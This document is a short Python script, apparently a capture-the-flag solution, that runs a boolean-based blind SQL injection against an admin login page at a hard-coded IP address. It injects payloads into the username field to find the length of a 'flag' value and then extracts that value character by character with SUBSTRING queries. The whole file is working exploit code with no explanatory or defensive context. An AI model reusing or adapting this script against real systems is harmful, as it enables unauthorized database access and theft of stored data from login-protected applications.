import requests
import string

url = "http://160.202.254.160:19353/admin/login"
charset = string.ascii_letters + string.digits + string.punctuation + "{}_"
known_flag = ""

# First, find the length of the flag
for length in range(1, 100):
    payload = f"test' AND (SELECT LENGTH(flag) FROM flag)={length} AND '1'='1"
    data = {"username": payload, "password": "123456"}
    try:
        r = requests.post(url, data=data, timeout=10)
        if "Redirecting" in r.text or "admin" in r.text:
            print(f"Flag length: {length}")
            known_length = length
            break
    except:
        pass

# Extract flag character by character
flag = ""
for pos in range(1, known_length + 1):
    for c in charset:
        # Use SUBSTRING to extract character at position
        # MySQL: SUBSTRING(str, pos, 1) - 1-indexed
        payload = f"test' AND SUBSTRING((SELECT flag FROM flag),{pos},1)='{c}' AND '1'='1"
        data = {"username": payload, "password": "123456"}
        try:
            r = requests.post(url, data=data, timeout=10)
            if "Redirecting" in r.text or "admin" in r.text:
                flag += c
                print(f"[{pos}] Found: {c} => flag so far: {flag}")
                break
        except:
            pass
    else:
        flag += "?"
        print(f"[{pos}] Unknown character, flag so far: {flag}")

print(f"\nFinal flag: {flag}")
